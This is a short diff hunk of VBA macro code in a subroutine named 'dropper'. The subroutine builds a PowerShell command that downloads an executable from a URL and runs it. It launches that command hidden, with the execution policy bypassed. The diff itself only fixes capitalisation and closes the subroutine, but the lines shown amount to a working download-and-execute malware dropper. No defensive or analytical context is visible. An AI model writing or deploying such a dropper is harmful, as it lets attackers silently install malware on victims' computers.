@@ -41,5 +41,6 @@ Sub dropper()
   scriptPath = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrLf & _
   "Start-Process -FilePath ""C:\Users\Admin\file.exe"""
 
-  Shell "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & scriptPath & """"
+  Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & scriptPath & """"
+End Sub
 ```
